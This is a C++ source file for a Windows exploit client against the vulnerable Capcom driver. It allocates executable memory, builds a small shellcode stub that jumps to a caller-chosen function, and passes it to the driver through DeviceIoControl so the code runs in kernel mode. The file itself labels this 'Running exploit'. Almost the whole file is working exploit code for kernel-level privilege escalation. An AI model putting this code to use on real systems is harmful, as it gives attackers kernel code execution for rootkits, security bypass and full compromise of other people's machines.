#include "Capcom.h"
#include <Windows.h>
#include <stdio.h>
 
void CapcomIoctl::Build(fnCapcomRunFunc UserFunction, PVOID UserData)
{
    printf("[Capcom] Building request...\n");
    printf("[Capcom] Function: %p\n", UserFunction);
    printf("[Capcom] Data    : %p\n", UserData);
    
    // This is where the code that will be executed will reside.
    // We need EXECUTE access on this memory page.
    CapcomCodePayload* CodePayload
        = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
    printf("[Capcom] Payload allocated at %p\n", CodePayload);
 
    // This payload is what will be executed. 
    // It will mov the CustomData into RDX and then JMP to the function
    // pointed by UserFunction
    BYTE CodePayloadTemp[] =
    {
        0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, CustomData
        0x58,                                                       // POP RAX
        0xFF, 0x20                                                  // JMP [RAX]
    };
 
    // Fill in the missing bytes
    *(ULONGLONG*)(CodePayloadTemp + 0x5) = (ULONGLONG)UserFunction;
    *(ULONGLONG*)(CodePayloadTemp + 0xF) = (ULONGLONG)UserData;
 
    // Make everything point at what it needs to
    CodePayload->PointerToPayload   = CodePayload->Payload;
    this->PointerToPayload          = CodePayload->Payload;
 
    // Copy the payload into the buffer that is going to be sent
    ZeroMemory(CodePayload->Payload, PAYLOAD_BUFFER_SIZE);
    CopyMemory(CodePayload->Payload, CodePayloadTemp, sizeof(CodePayloadTemp));
 
}
 
void CapcomIoctl::Free()
{
    VirtualFree(PointerToPayload, 0, MEM_RELEASE);
}
 
void CapcomIoctl::Run(HANDLE CapcomDevice)
{
    DWORD OutputBuffer;
    DWORD BytesReturned;
 
    printf("[Capcom] Running exploit...\n");
    if(DeviceIoControl(CapcomDevice, IOCTL_X64, &PointerToPayload, 8, &OutputBuffer, 4, &BytesReturned, nullptr)) {
        printf("[Capcom] Success\n", OutputBuffer);
    } else {
        printf("[Capcom] Error %d\n", GetLastError());
    }
}